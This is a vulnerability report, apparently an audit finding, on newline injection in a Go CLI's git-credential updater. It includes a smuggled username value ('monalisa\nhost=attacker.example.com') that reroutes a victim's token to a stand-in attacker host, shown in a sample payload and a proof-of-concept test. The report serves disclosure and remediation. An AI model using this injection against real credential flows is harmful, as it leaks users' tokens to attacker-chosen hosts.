### Title
Newline injection in git-credential `approve` payload allows attacker-controlled `username`/`password` to override the `host` field, storing the victim's real credential under an attacker-chosen host - (File: pkg/cmd/auth/shared/gitcredentials/updater.go)

### Summary
`Updater.Update` builds the `git credential reject`/`approve` stdin payloads via unsanitized `%s` string interpolation (`heredoc.Docf`) of `hostname`, `username`, and `password`. Because the `git-credential` line protocol parses each `key=value` line independently and later keys overwrite earlier ones for the same credential object, an attacker-controlled `username` or `password` value containing an embedded newline plus `host=<attacker-host>` can override the `host=` line already written for the real host in the `approve` payload, while the preceding `reject` call (which does not include a spoofable field) still clears the legitimate host's stored credential.

### Finding Description
`Update` issues two sequential git-credential invocations: [1](#0-0) 

The `reject` payload only interpolates `hostname`, so it reliably targets and clears the real host's cached credential. The `approve` payload interpolates `hostname`, `username`, and `password` into consecutive `key=value` lines with no escaping of `\n`. Git's credential-protocol reader (`credential_read` in `credential.c`) parses this stream line-by-line until a blank line/EOF and, for each recognized key, assigns the value onto the credential struct in the order lines appear — a later `host=` line overwrites an earlier one. Since `username` and `password` are attacker-influenced values that flow unsanitized from `GitCredentialFlow.Setup(hostname, username, authToken)` into `Updater.Update`, an attacker-crafted `username` such as `monalisa\nhost=attacker.example.com` produces an `approve` stdin of:
```
protocol=https
host=<real-host>
username=monalisa
host=attacker.example.com
password=<real-token>
```
which git's credential helper will store keyed to `attacker.example.com` rather than `<real-host>`. Because `reject` already cleared the legitimate host's entry and did not depend on the injectable fields, the net effect is: the real host ends up with no stored credential, while the attacker-chosen host is stored with the victim's real token. No validation, allowlisting, or character sanitization exists anywhere in `updater.go` for `hostname`, `username`, or `password` before they are embedded into the protocol text.

### Impact Explanation
This is a wrong-host credential routing / credential exfiltration primitive: the victim's real OAuth/PAT token becomes associated with a credential-helper entry for a host the attacker chose, and subsequent git operations against `attacker.example.com` (if it can be reached via https, e.g., through a URL or remote the victim later uses) would present the victim's real token to that host, and/or the real host loses git credential integration entirely (denial of intended functionality). This matches the "wrong-host or wrong-account request routing" and "credential exfiltration" impact classes in scope.

### Likelihood Explanation
This finding inherits the same precondition as the referenced scenario 2: the attacker must control the `username` or `authToken` value passed into `Update` (e.g., via a malicious/compromised OAuth response from a host the victim points `gh` at, per the stated threat model). Given that precondition, the exploit is deterministic and repeatable — it does not depend on timing or race conditions, only on the ability to embed a newline character in the `username`/`password` string, which nothing in the call chain filters.

### Recommendation
Reject or escape newline characters in `hostname`, `username`, and `password` before constructing the git-credential protocol payload, or better, build the payload using a real key/value writer that percent/escapes values instead of raw `%s` string formatting via `heredoc.Docf`. Additionally, consider writing `host=` last (or validating no other line can inject a `host=` key) so that no attacker-controlled field can ever precede/override the trusted host value.

### Proof of Concept
Go/git-stub test (mirrors `updater_test.go` pattern):
```go
func TestUpdateRejectsHostInjectionViaUsername(t *testing.T) {
    git.IsolateConfig(t)
    configureStoreCredentialHelper(t)

    u := &gitcredentials.Updater{GitClient: &git.Client{}}

    maliciousUsername := "monalisa\nhost=attacker.example.com"
    realToken := "real-victim-token"

    require.NoError(t, u.Update("github.com", maliciousUsername, realToken))

    // Real host should have no credential left.
    realHostResult := fillCredentialsFor(t, "github.com")
    require.NotContains(t, realHostResult, realToken)

    // Attacker host should now hold the victim's real token.
    attackerHostResult := fillCredentialsFor(t, "attacker.example.com")
    require.Contains(t, attackerHostResult, realToken)
}
```
Expected assertion: `git credential fill` for `host=github.com` returns nothing containing `realToken`, while `git credential fill` for `host=attacker.example.com` returns the real token, confirming credential misrouting caused by unsanitized newline injection in `Updater.Update`'s `approve` payload.
